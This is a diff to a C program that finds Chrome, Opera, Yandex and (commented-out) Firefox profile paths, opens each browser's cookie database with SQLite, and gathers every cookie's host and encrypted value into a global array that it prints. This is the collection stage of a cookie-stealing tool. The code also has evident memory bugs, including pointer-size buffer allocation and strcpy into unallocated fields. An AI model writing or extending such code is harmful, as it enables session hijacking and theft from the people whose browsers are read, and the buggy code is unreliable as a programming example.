@@ -24,9 +24,10 @@
 #endif
 
 
-/* Global cookie datatype array offset for callback 
+/* Global cookies array and it's offset for callback.
 */
 uint32_t offset = 0;
+cookies_datatype* local_container;
 
 
 int main(void)
@@ -65,13 +66,17 @@ int main(void)
         local_machine.FF, local_machine.CH,
         local_machine.OP, local_machine.YA);
 
-    struct cookies_datatype* local_container = collect_data(local_machine);
+    /* Here we go. */
+    local_container = calloc(1, sizeof(cookies_datatype));
+    collect_data(local_machine);
 
-    /* for (int i = 0; i < offset; i++)
-        printf("host: %s\nvalue: %s\n", 
+    /* Just in case. */
+    for (int i = 0; i < offset; i++)
+    {
+        printf("[%d] host: %s, value: %s\n", i,
             local_container[i].host,
             local_container[i].value);
-            */
+    }
 
     return 0;
 }
@@ -139,67 +144,65 @@ browser_prediction check_browsers(char* local, char* roaming)
 
 /* Collect SQL data from databases of browser's cookies.
 */
-struct cookies_datatype* collect_data(browser_prediction status)
+void collect_data(browser_prediction status)
 {
-    struct cookies_datatype local_container[256];
-    char* u_path = status.user_path;
+    char* u_path    = status.user_path;
     char* full_path = malloc(sizeof(u_path) + sizeof(YA_PATH) + 1);
 
     //if (status.FF)
-        //get_sql(&local_container, FF_PATH, FF_TYPE);
+        //get_sql(full_path, CH_TYPE);
 
     if (status.CH)
     {
         sprintf(full_path, "%s%s", u_path, CH_PATH);
-        get_sql(local_container, full_path, CH_TYPE);
+        get_sql(full_path, CH_TYPE);
     }
 
     if (status.OP)
     {
         sprintf(full_path, "%s%s", u_path, OP_PATH);
-        get_sql(local_container, full_path, CH_TYPE);
+        get_sql(full_path, CH_TYPE);
     }
 
     if (status.YA)
     {
         sprintf(full_path, "%s%s", u_path, YA_PATH);
-        get_sql(local_container, full_path, CH_TYPE);
+        get_sql(full_path, CH_TYPE);
     }
 
     free(full_path);
-
-    return local_container;
 }
 
 
 /* Callback function for SQL request to the database.
 */
-static int callback(struct cookies_datatype* cont, int argc, char **argv, char **colname)
+static int callback(uint8_t bt, int argc, char **argv, char **colname)
 {
-    if (offset >= 256) return 0;
-    int i = 0;
-    for (; i < argc; i++)
+    for (int i = 0; i < argc; i++)
     {
-        cont[i+offset].value  = argv[i] ? argv[i] : "NULL";
-        cont[i+offset].host   = colname[i];
-        cont[i+offset].b_type = 1; 
+        if ( !(strcmp(colname[i], "host_key")) )
+            strcpy(local_container[offset].host, argv[i]);
 
-        printf("%s\n", cont[i+offset].host);
+        else if ( !(strcmp(colname[i], "encrypted_value")) )
+            strcpy(local_container[offset].value, argv[i]);
     }
-    offset += i;
 
+    local_container[offset].b_type = bt;
+    local_container = realloc(local_container, sizeof(*local_container) * (offset+2));
+
+    offset++;
     return 0;
 }
 
 
 /* Will get data from SQL database and 'll put it in container.
 */
-void get_sql(struct cookies_datatype* cont, const char* sql_path, uint8_t bt)
+void get_sql(const char* sql_path, uint8_t bt)
 {
     sqlite3* database;
     char* err = 0;
     int s_code;
-    const char request[30];
+    char request[50];
 
     s_code = sqlite3_open(sql_path, &database);
 
@@ -213,6 +216,6 @@ void get_sql(struct cookies_datatype* cont, const char* sql_path, uint8_t bt)
         return;
     }
 
-    s_code = sqlite3_exec(database, request, callback, cont, &err);
+    s_code = sqlite3_exec(database, request, callback, bt, &err);
     sqlite3_close(database);
 }
